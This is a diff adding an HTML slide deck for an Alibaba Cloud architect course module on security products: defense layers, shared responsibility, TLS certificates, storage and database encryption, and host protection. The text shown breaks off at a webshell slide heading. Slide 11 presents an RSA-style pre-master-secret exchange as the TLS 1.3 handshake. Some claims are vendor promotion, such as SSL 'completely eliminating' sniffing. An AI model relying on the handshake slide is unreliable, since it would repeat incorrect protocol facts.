@@ -1,0 +1,1716 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 09: Security Products &amp; Defense Architecture | Alibaba Cloud Professional</title>
+  <link rel="stylesheet" href="assets/css/style.css">
+</head>
+<body>
+
+  <!-- Top Header Navigation -->
+  <header class="presentation-header">
+    <div class="brand-wrapper">
+      <span class="brand-badge">Alibaba Cloud</span>
+      <div class="course-info">
+        <span class="course-title">Alibaba Cloud Professional: Cloud Architect</span>
+        <span class="module-title">Module 09: Security Products &amp; Defense Architecture Deep Dive</span>
+      </div>
+    </div>
+    <div class="header-right">
+      <span class="section-indicator" id="sectionIndicator">Overview</span>
+      <div class="module-switcher-wrapper">
+        <select class="module-select" id="moduleSelect" onchange="if(this.value) window.location.href=this.value;">
+          <option value="module-01-overview.html">Module 01: Overview</option>
+          <option value="module-02-ecs.html">Module 02: ECS</option>
+          <option value="module-03-vpc.html">Module 03: VPC</option>
+          <option value="module-04-slb.html">Module 04: SLB</option>
+          <option value="module-05-oss.html">Module 05: OSS</option>
+          <option value="module-06-rds.html">Module 06: RDS</option>
+          <option value="module-07-auto-scaling.html">Module 07: Auto Scaling</option>
+          <option value="module-08-cdn.html">Module 08: CDN</option>
+          <option value="module-09-security.html" selected>Module 09: Security</option>
+        </select>
+      </div>
+      <div class="nav-buttons">
+        <span class="slide-counter" id="slideCounter">1/47</span>
+        <button class="btn-nav" id="prevBtn" title="Previous Slide (Left Arrow)">
+          <span>⬅️</span> Previous
+        </button>
+        <button class="btn-nav primary" id="nextBtn" title="Next Slide (Right Arrow / Space)">
+          Next <span>➡️</span>
+        </button>
+        <button class="btn-nav" id="fullscreenBtn" title="Toggle Fullscreen (F)">
+          <span>⛶</span> Fullscreen
+        </button>
+      </div>
+    </div>
+    <div class="slide-progress-bar" id="progressBar"></div>
+  </header>
+
+  <!-- Presentation Deck Container -->
+  <main class="deck-container">
+
+    <!-- ==================== SLIDE 1: CLEAN TITLE ==================== -->
+    <section class="slide active title-slide" data-category="Course Intro">
+      <h1>Module 09: Security Products &amp; Defense Architecture</h1>
+    </section>
+
+    <!-- ==================== SLIDE 2: AGENDA LIST ==================== -->
+    <section class="slide" data-category="Outline">
+      <div class="slide-category">Module Structure</div>
+      <h2>Agenda &amp; Learning Objectives</h2>
+      
+      <ol class="agenda-grid">
+        <li class="agenda-item">Security Architecture &amp; Defense Hierarchy</li>
+        <li class="agenda-item">Data &amp; Storage Security</li>
+        <li class="agenda-item">Host &amp; Workload Protection</li>
+        <li class="agenda-item">Web Application Firewall (WAF)</li>
+        <li class="agenda-item">Network Security &amp; Anti-DDoS</li>
+        <li class="agenda-item">Security Operations &amp; Best Practices</li>
+      </ol>
+    </section>
+
+    <!-- ==================== SECTION 1: SECURITY ARCHITECTURE & DEFENSE HIERARCHY ==================== -->
+
+    <!-- SLIDE 3: SERVICE INTRODUCTION -->
+    <section class="slide" data-category="Security Architecture &amp; Defense Hierarchy">
+      <div class="slide-category">Section 1: Security Architecture &amp; Defense Hierarchy</div>
+      <h2>Alibaba Cloud Security Services</h2>
+      
+      <div class="service-intro-banner">
+        <div class="service-icon-wrapper">
+          <img src="assets/images/security-service-icon.svg" alt="Alibaba Cloud Security Service Icon" class="service-icon">
+        </div>
+        <div class="service-intro-text">
+          <p class="service-lead">
+            <strong>Alibaba Cloud Security</strong> provides an enterprise-grade, multi-dimensional security ecosystem engineered from over 15 years of hyperscale defense experience protecting the Alibaba Group and millions of enterprise cloud customers.
+          </p>
+          <p class="service-desc">
+            Compared to traditional fragmented perimeter tools, Alibaba Cloud Security integrates deep defense-in-depth across physical infrastructure, virtualization, network boundaries, application runtimes, and persistent data tiers with unified AI-driven threat intelligence.
+          </p>
+        </div>
+      </div>
+
+      <div class="service-pillars-grid">
+        <div class="service-pillar-card">
+          <h4>🛡️ Multi-Layer Defense</h4>
+          <p>Deep defense-in-depth spanning perimeter, network, host, application, and data layers.</p>
+        </div>
+        <div class="service-pillar-card">
+          <h4>⚡ Hyperscale Resilience</h4>
+          <p>Defends against multi-terabit volumetric attacks with automated near-source scrubbing.</p>
+        </div>
+        <div class="service-pillar-card">
+          <h4>🧠 AI Threat Intelligence</h4>
+          <p>Machine learning behavioral models identifying 0-day exploits and malicious bots in real-time.</p>
+        </div>
+        <div class="service-pillar-card">
+          <h4>🔒 Zero Trust Governance</h4>
+          <p>Granular RAM identities, MFA, least-privilege policies, and end-to-end cryptographic enforcement.</p>
+        </div>
+        <div class="service-pillar-card">
+          <h4>📜 Compliance Assured</h4>
+          <p>Full regulatory compliance with ISO 27001, SOC 1/2/3, PCI-DSS, GDPR, and MLPS Level 3/4.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 4: DEFENSE PROVEN HERITAGE -->
+    <section class="slide" data-category="Security Architecture &amp; Defense Hierarchy">
+      <div class="slide-category">Section 1: Security Architecture &amp; Defense Hierarchy</div>
+      <h2>Hyperscale Defense: Proven at Global Scale</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/security-service-scale.png" alt="Alibaba Cloud Security Defense Scale and Statistics" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Safeguarding 40%+ of China's Web Presence &amp; Mitigating 3.6B Daily Attacks</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Battle-Tested Enterprise Defense</h3>
+            <p>Alibaba Cloud operates one of the world's largest commercial cloud defense operations:</p>
+            <ul>
+              <li><strong>Broadest Web Protection:</strong> Safeguards over <strong>40% of all public websites</strong> operating in China against cyber espionage and extortion.</li>
+              <li><strong>Continuous High-Volume Mitigation:</strong> Neutralizes over <strong>3.6 billion cyber attacks daily</strong>, including sophisticated Layer 7 CC floods and multi-vector exploits.</li>
+              <li><strong>The Double 11 E-Commerce Benchmark:</strong> Provides uncompromised 100% availability during the world's largest flash-sale transactions without a single security breach.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Strategic Threat Intelligence Synergy</h3>
+            <p>Every attack absorbed across the cloud instantly strengthens security for every enterprise tenant:</p>
+            <ul>
+              <li><strong>Petabyte Log Telemetry:</strong> Machine learning clusters parse global attack vectors to identify newly emergent malicious IP pools within seconds.</li>
+              <li><strong>Automated Rule Propagation:</strong> WAF and Anti-DDoS defense rules update automatically without requiring manual tenant interventions.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 5: MULTI-LAYER ARCHITECTURE -->
+    <section class="slide" data-category="Security Architecture &amp; Defense Hierarchy">
+      <div class="slide-category">Section 1: Security Architecture &amp; Defense Hierarchy</div>
+      <h2>Multi-Layer Cloud Security Architecture</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/security-architecture-layers.png" alt="Multi-Layer Security Architecture Stack" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">End-to-End Defense Stack: Physical, Hardware, Virtualization, System, and Tenant Layers</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight">
+            <h3>Foundational Infrastructure Tiers</h3>
+            <ul>
+              <li><strong>Physical Security:</strong> Biometric mantrap access, 24/7 video surveillance, redundant power, and environmental controls across all hyperscale datacenters.</li>
+              <li><strong>Hardware Security:</strong> Custom-engineered server chassis, hardware root-of-trust (RoT), TPM cryptoprocessors, and secure firmware verification.</li>
+              <li><strong>Virtualization Security:</strong> Proprietary hardware-accelerated hypervisor isolating tenant memory spaces and preventing cross-VM side-channel leaks.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-blue">
+            <h3>Cloud Platform &amp; Customer Tiers</h3>
+            <ul>
+              <li><strong>Cloud System Security:</strong> Apsara distributed operating system core security, Pangu multi-replica data sharding, and isolated internal SDN fabrics.</li>
+              <li><strong>Customer Workload Security:</strong> Full tenant control over VPC segmentation, Security Group micro-segmentation, RAM identities, and data encryption keys.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 6: SHARED RESPONSIBILITY MODEL -->
+    <section class="slide" data-category="Security Architecture &amp; Defense Hierarchy">
+      <div class="slide-category">Section 1: Security Architecture &amp; Defense Hierarchy</div>
+      <h2>Shared Responsibility Model for Cloud Security</h2>
+      
+      <div class="table-wrapper" style="margin-top: 0.5rem;">
+        <table class="slide-table">
+          <thead>
+            <tr>
+              <th>Architecture Component</th>
+              <th>On-Premises</th>
+              <th>IaaS (ECS, VPC)</th>
+              <th>PaaS (RDS, PolarDB)</th>
+              <th>SaaS (DirectMail)</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><strong>Customer Data &amp; Access Controls</strong></td>
+              <td>Customer</td>
+              <td><strong>Customer</strong></td>
+              <td><strong>Customer</strong></td>
+              <td><strong>Customer</strong></td>
+            </tr>
+            <tr>
+              <td><strong>Application Code &amp; Logic</strong></td>
+              <td>Customer</td>
+              <td><strong>Customer</strong></td>
+              <td><strong>Customer</strong></td>
+              <td>Alibaba Cloud</td>
+            </tr>
+            <tr>
+              <td><strong>Operating System &amp; Patching</strong></td>
+              <td>Customer</td>
+              <td><strong>Customer</strong></td>
+              <td>Alibaba Cloud</td>
+              <td>Alibaba Cloud</td>
+            </tr>
+            <tr>
+              <td><strong>Database Engine &amp; High Availability</strong></td>
+              <td>Customer</td>
+              <td>Customer</td>
+              <td>Alibaba Cloud</td>
+              <td>Alibaba Cloud</td>
+            </tr>
+            <tr>
+              <td><strong>Hypervisor &amp; SDN Virtualization</strong></td>
+              <td>Customer</td>
+              <td>Alibaba Cloud</td>
+              <td>Alibaba Cloud</td>
+              <td>Alibaba Cloud</td>
+            </tr>
+            <tr>
+              <td><strong>Physical Hardware &amp; Facilities</strong></td>
+              <td>Customer</td>
+              <td>Alibaba Cloud</td>
+              <td>Alibaba Cloud</td>
+              <td>Alibaba Cloud</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="grid-2" style="margin-top: 0.85rem;">
+        <div class="content-card highlight-green">
+          <h3>Security OF the Cloud (Alibaba Cloud)</h3>
+          <p>Alibaba Cloud guarantees the physical integrity, hardware health, hypervisor isolation, global network backbones, and managed service uptime.</p>
+        </div>
+        <div class="content-card highlight-blue">
+          <h3>Security IN the Cloud (Customer)</h3>
+          <p>Customers maintain full authority and accountability over IAM/RAM access, security group rules, OS security patching, and application vulnerability hardening.</p>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 7: SECURITY SERVICE FAMILY -->
+    <section class="slide" data-category="Security Architecture &amp; Defense Hierarchy">
+      <div class="slide-category">Section 1: Security Architecture &amp; Defense Hierarchy</div>
+      <h2>Security Service Family Matrix</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/security-product-family.png" alt="Alibaba Cloud Security Service Family Map" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Comprehensive Defense Suite: Host, Network, Application, and Managed Security Services</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Perimeter &amp; Network Defense</h3>
+            <ul>
+              <li><strong>Anti-DDoS (Basic / Pro / Premium):</strong> Defends against Layer 3/4 volumetric floods up to multiple terabits with automated BGP and Anycast routing.</li>
+              <li><strong>Web Application Firewall (WAF):</strong> Filters malicious Layer 7 HTTP/HTTPS traffic, blocking SQL injection, XSS, and automated crawler bots.</li>
+              <li><strong>Cloud Firewall:</strong> Centralized northbound, southbound, and VPC east-west network traffic filtering and micro-segmentation.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Host, Identity &amp; Operations</h3>
+            <ul>
+              <li><strong>Security Center (Server Guard):</strong> Endpoint detection and response (EDR), vulnerability patching, baseline checks, and webshell detection.</li>
+              <li><strong>Key Management Service (KMS):</strong> Cryptographic hardware security module (HSM) key lifecycle management and envelope encryption.</li>
+              <li><strong>Bastionhost:</strong> Centralized privileged access management (PAM) with full session recording, MFA, and command auditing.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 8: THREAT LANDSCAPE -->
+    <section class="slide" data-category="Security Architecture &amp; Defense Hierarchy">
+      <div class="slide-category">Section 1: Security Architecture &amp; Defense Hierarchy</div>
+      <h2>Cloud Threat Vectors &amp; Attack Surfaces</h2>
+      
+      <div class="grid-3" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-amber">
+          <h3>Network-Layer Vectors</h3>
+          <ul>
+            <li><strong>Volumetric SYN/UDP Floods:</strong> Saturating gateway pipes to disrupt legitimate customer connectivity.</li>
+            <li><strong>Amplification Attacks:</strong> Exploiting misconfigured DNS, NTP, and Memcached servers to multiply attack volume.</li>
+            <li><strong>State-Table Exhaustion:</strong> Flooding firewalls with half-open connections to crash connection tables.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-blue">
+          <h3>Application-Layer Exploits</h3>
+          <ul>
+            <li><strong>OWASP Top 10 Exploits:</strong> SQL injection, Cross-Site Scripting (XSS), CSRF, and XML External Entity (XXE) flaws.</li>
+            <li><strong>Challenge Collapsar (CC):</strong> Flooding expensive search or report URIs with valid HTTP GET/POST queries.</li>
+            <li><strong>Scraping &amp; Account Takeover:</strong> Automated botnets scraping pricing data and brute-forcing credentials.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Host &amp; Identity Risks</h3>
+          <ul>
+            <li><strong>Webshell Backdoors:</strong> Uploading server-side scripts through unvalidated file upload handlers.</li>
+            <li><strong>Unpatched OS Vulnerabilities:</strong> Exploiting known CVEs in outdated Linux kernels or web server packages.</li>
+            <li><strong>Credential Exfiltration:</strong> Leaking hardcoded AccessKeys or granting excessive administrator permissions.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 2: DATA & STORAGE SECURITY ==================== -->
+
+    <!-- SLIDE 9: CLOUD DATA SECURITY ARCHITECTURE -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>End-to-End Cloud Data Security Lifecycle</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/cloud-data-security-architecture.png" alt="Cloud Data Security Architecture Diagram" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Three Pillars of Enterprise Data Protection: Data at Rest, in Transit, and in Processing</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Data in Transit (Transmission Security)</h3>
+            <ul>
+              <li><strong>Mandatory Cryptographic Protocols:</strong> Enforce TLS 1.2 and TLS 1.3 across all public endpoints and internal service boundaries.</li>
+              <li><strong>HTTPS Redirection:</strong> Automatically redirect HTTP port 80 requests to secure HTTPS port 443 at the edge (CDN, SLB).</li>
+              <li><strong>Private Network Isolation:</strong> Route confidential traffic exclusively over VPC private SDN and PrivateLink without public exposure.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Data at Rest (Storage Security)</h3>
+            <ul>
+              <li><strong>Envelope Encryption:</strong> Transparent Data Encryption (TDE) for RDS disks and Server-Side Encryption (SSE) for OSS objects.</li>
+              <li><strong>Hardware-Backed Keys:</strong> Customer Master Keys (CMK) generated and safeguarded inside FIPS 140-2 Level 3 compliant HSMs.</li>
+              <li><strong>Point-in-Time Recovery:</strong> Automated snapshot chains and continuous database binlog archiving for disaster recovery.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 10: SSL CERTIFICATES SERVICE -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>Alibaba Cloud SSL Certificates Service</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Centralized Certificate Lifecycle Management</h3>
+          <p>Alibaba Cloud SSL Certificates Service provides automated procurement, deployment, and renewal of digital server certificates:</p>
+          <ul>
+            <li><strong>Trusted Certificate Authorities (CAs):</strong> Direct platform partnerships with DigiCert, GeoTrust, GlobalSign, and vTrus.</li>
+            <li><strong>Flexible Certificate Tiers:</strong> Supports Domain Validation (DV), Organization Validation (OV), Extended Validation (EV), Multi-Domain (SAN), and Wildcard certificates.</li>
+            <li><strong>Automated Domain Verification:</strong> Automated DNS record synchronization via Alibaba Cloud DNS eliminates manual verification delays.</li>
+            <li><strong>Proactive Expiry Alerts:</strong> Automated notifications via SMS, Email, and DingTalk delivered 30, 15, and 3 days before expiration.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>One-Click Cloud-Native Deployment</h3>
+          <p>Seamlessly push verified digital certificates across the entire Alibaba Cloud application delivery pipeline:</p>
+          <ul>
+            <li><strong>Server Load Balancer (SLB):</strong> Bind certificates directly to HTTPS listeners to offload CPU-intensive TLS handshakes from backend servers.</li>
+            <li><strong>Content Delivery Network (CDN):</strong> Deploy certificates to 3,200+ edge nodes globally with a single console action.</li>
+            <li><strong>Web Application Firewall (WAF):</strong> Decrypt incoming HTTPS traffic in memory for deep packet inspection without saving private keys on disk.</li>
+            <li><strong>Zero Downtime Rollover:</strong> Automatic hot-swapping of renewed certificates without terminating active user TCP connections.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 11: SSL/TLS HANDSHAKE -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>The SSL / TLS 1.3 Handshake Workflow</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/ssl-handshake-workflow.png" alt="SSL TLS Handshake 5-Stage Protocol Flow" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Cryptographic Handshake: Negotiating Ciphers, Asymmetric Exchange, and Symmetric Sessions</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Protocol Handshake Mechanics</h3>
+            <ul>
+              <li><strong>Step 1: Client Hello:</strong> Client sends supported TLS versions, cipher suites list, and a random cryptographic byte string.</li>
+              <li><strong>Step 2: Server Hello &amp; Certificate:</strong> Server selects the strongest mutual cipher suite, returns its digital certificate, and sends server random bytes.</li>
+              <li><strong>Step 3: Verification &amp; Pre-Master Secret:</strong> Client validates certificate signature against trusted root CAs and transmits encrypted Pre-Master Secret.</li>
+              <li><strong>Step 4: Session Key Derivation:</strong> Both parties compute identical symmetric session keys (AES-256-GCM) from the shared secret.</li>
+              <li><strong>Step 5: Finished &amp; Encrypted Tunnel:</strong> All subsequent HTTP requests and responses travel across the high-speed symmetric encrypted channel.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 12: MULTI-PRODUCT HTTPS DEPLOYMENT -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>Enterprise Multi-Product SSL Deployment</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/ssl-multi-product-deployment.png" alt="Multi-Product HTTPS Deployment Topology" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Perimeter-to-Core HTTPS Pipeline: Edge CDN / Anti-DDoS -> WAF -> SLB -> ECS Backends</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-green">
+            <h3>Cohesive Perimeter Offloading</h3>
+            <ul>
+              <li><strong>Edge Offloading:</strong> CDN edge nodes and Anti-DDoS scrubbing centers terminate TLS near the client, reducing round-trip latency.</li>
+              <li><strong>Layer 7 Security Inspection:</strong> WAF inspects decrypted HTTP requests for malicious payloads (SQLi, XSS) before re-encrypting traffic to SLB.</li>
+              <li><strong>Hardware-Accelerated SLB:</strong> Server Load Balancers leverage specialized cryptographic accelerators to handle 100,000+ TLS handshakes per second.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight">
+            <h3>Backend Encryption Flexibility</h3>
+            <ul>
+              <li><strong>SSL Termination Mode:</strong> Decrypt at SLB and forward HTTP over private VPC backbones to maximize backend compute efficiency.</li>
+              <li><strong>End-to-End SSL Mode:</strong> SLB re-encrypts traffic over HTTPS to backend ECS instances to satisfy strict banking and medical compliance mandates.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 13: STORAGE DATA PROTECTION (OSS) -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>OSS Storage Security &amp; Encryption</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Server-Side Encryption (SSE) Models</h3>
+          <ul>
+            <li><strong>SSE-OSS (Fully Managed):</strong> OSS handles encryption and key management transparently using industry-standard AES-256. Zero operational overhead or separate key fees.</li>
+            <li><strong>SSE-KMS (Customer Controlled):</strong> Uses envelope encryption with keys managed in Key Management Service (KMS). Allows automated annual key rotation and fine-grained RAM key access policies.</li>
+            <li><strong>BYOK (Bring Your Own Key):</strong> Import custom proprietary cryptographic keys into KMS HSMs to maintain strict cryptographic sovereignty.</li>
+            <li><strong>Client-Side Encryption:</strong> Data is encrypted by client applications before traversing the network; OSS only ever stores opaque ciphertext.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Perimeter &amp; Tamper-Proof Controls</h3>
+          <ul>
+            <li><strong>VPC Boundary Bucket Policies:</strong> Explicitly deny all bucket access requests originating from outside designated VPC perimeters, neutralizing leaked AccessKey threats.</li>
+            <li><strong>Write Once, Read Many (WORM):</strong> Bucket retention policies lock objects into an immutable state (up to 70 years). Even root account administrators cannot delete locked records.</li>
+            <li><strong>Pre-Signed URLs:</strong> Generate temporary, cryptographically signed URLs for direct client uploads/downloads with strict time-to-live (TTL) expiration.</li>
+            <li><strong>Object Versioning:</strong> Protects against accidental overwrites and ransomware by preserving historical object iterations.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 14: DATABASE SECURITY & RDS SSL -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>RDS Database Security &amp; SSL Encryption</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/rds-ssl-encryption.png" alt="RDS End-to-End SSL Encryption via SLB" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">End-to-End Encrypted Tunnel from Compute Clients to RDS via SLB Integration</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-blue">
+            <h3>Connection &amp; Network Safeguards</h3>
+            <ul>
+              <li><strong>End-to-End SSL/TLS:</strong> Enforce SSL encryption between ECS application servers and RDS instances, completely eliminating packet sniffing.</li>
+              <li><strong>IP Whitelist Matrix:</strong> Configure up to <strong>1,000 IP addresses</strong> across 50 dedicated whitelist groups; unlisted IPs receive instant connection drops.</li>
+              <li><strong>VPC Internal Endpoints:</strong> Restrict database access strictly to internal VPC IP addresses; disable public internet endpoints entirely.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight-green">
+            <h3>Storage Encryption &amp; Audit</h3>
+            <ul>
+              <li><strong>Transparent Data Encryption (TDE):</strong> Real-time disk encryption for database files, transaction logs, and snapshots using AES-256 keys managed in KMS.</li>
+              <li><strong>SQL Audit Logging:</strong> Records every incoming SQL statement (DDL/DML), client IP, execution latency, and affected rows for regulatory forensic audits.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 15: ENTERPRISE SECURED CLOUD ARCHITECTURE -->
+    <section class="slide" data-category="Data &amp; Storage Security">
+      <div class="slide-category">Section 2: Data &amp; Storage Security</div>
+      <h2>Integrated Secure Cloud Architecture</h2>
+      
+      <div class="grid-2" style="align-items: center; gap: 1.5rem; margin-top: 0.5rem;">
+        <div class="architecture-diagram-wrapper" style="display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%;">
+          <div style="width: 100%; display: flex; justify-content: center; align-items: center;">
+            <img src="assets/images/secured-cloud-architecture.png" alt="Comprehensive Secured Cloud Architecture Blueprint" style="max-height: 380px; width: 100%; object-fit: contain;">
+          </div>
+          <div class="diagram-caption" style="margin-top: 0.5rem; text-align: center;">Comprehensive Reference Architecture: Network Perimeter, Application Tier, and Resilient Storage Tier</div>
+        </div>
+
+        <div style="display: flex; flex-direction: column; gap: 0.85rem;">
+          <div class="content-card highlight-green">
+            <h3>Defense-in-Depth Layering</h3>
+            <ul>
+              <li><strong>Edge Ingestion:</strong> Traffic enters through Anti-DDoS and WAF, stripping volumetric and application-layer attacks.</li>
+              <li><strong>Compute Decoupling:</strong> Server Load Balancers distribute sanitized traffic across auto-scaling ECS clusters in private subnets.</li>
+              <li><strong>Data Core Hardening:</strong> Persistent state resides in encrypted RDS and OSS tiers accessible only through strict security group rules.</li>
+            </ul>
+          </div>
+
+          <div class="content-card highlight">
+            <h3>Resilience &amp; Data Recovery</h3>
+            <ul>
+              <li><strong>Automated Disk Snapshots:</strong> Crash-consistent snapshot policies for ECS system and data disks.</li>
+              <li><strong>Cross-Zone RDS Active-Standby:</strong> Synchronous replication between availability zones with 30-second automated failover.</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- ==================== SECTION 3: HOST & WORKLOAD PROTECTION ==================== -->
+
+    <!-- SLIDE 16: SECURITY CENTER OVERVIEW -->
+    <section class="slide" data-category="Host &amp; Workload Protection">
+      <div class="slide-category">Section 3: Host &amp; Workload Protection</div>
+      <h2>Alibaba Cloud Security Center Overview</h2>
+      
+      <div class="grid-2" style="margin-top: 0.75rem;">
+        <div class="content-card highlight-blue">
+          <h3>Cloud-Native Workload Protection (CWPP)</h3>
+          <p>Security Center (formerly Server Guard) provides real-time threat detection, automated vulnerability management, and host baseline auditing:</p>
+          <ul>
+            <li><strong>Ultralight Daemon Agent:</strong> Installed across ECS instances, bare-metal servers, container nodes, and hybrid on-premises machines. Consumes <strong>&lt;1% CPU and &lt;50 MB RAM</strong>.</li>
+            <li><strong>Kernel-Level Event Hooks:</strong> Intercepts operating system system calls (syscalls), process spawning, network sockets, and file system modifications in real-time.</li>
+            <li><strong>Hybrid &amp; Multi-Cloud Visibility:</strong> Single pane of glass managing Linux (CentOS, Ubuntu, Debian, Alibaba Cloud Linux) and Windows Server instances across any cloud.</li>
+          </ul>
+        </div>
+
+        <div class="content-card highlight-green">
+          <h3>Core Operational Capabilities</h3>
+          <ul>
+            <li><strong>Trojan Virus &amp; Webshell Detection:</strong> AI-driven behavioral models identifying obfuscated malware, reverse shells, and malicious dropper scripts.</li>
+            <li><strong>Automated Vulnerability Management:</strong> Continuous scanning of Linux/Windows CVEs, Web CMS flaws, and 0-day disclosures with one-click automated hotfixing.</li>
+            <li><strong>Security Baseline Inspection:</strong> Audits host OS configurations against CIS benchmarks, identifying weak passwords and exposed administrative ports.</li>
+            <li><strong>Automated Defense Response:</strong> Instant IP blocking, process quarantine, and automated emergency snapshot creation upon ransomware detection.</li>
+          </ul>
+        </div>
+      </div>
+    </section>
+
+    <!-- SLIDE 17: WEBSHELL ATTACK ANATOMY -->
+    <section class="slide" data-category="Host &amp; Workload Protection">
+      <div class="slide-category">Section 3: Host &amp; Workload Protection</div>
+      <h2>Webshell Attack Mechanics &amp; Defense</h2>
+      
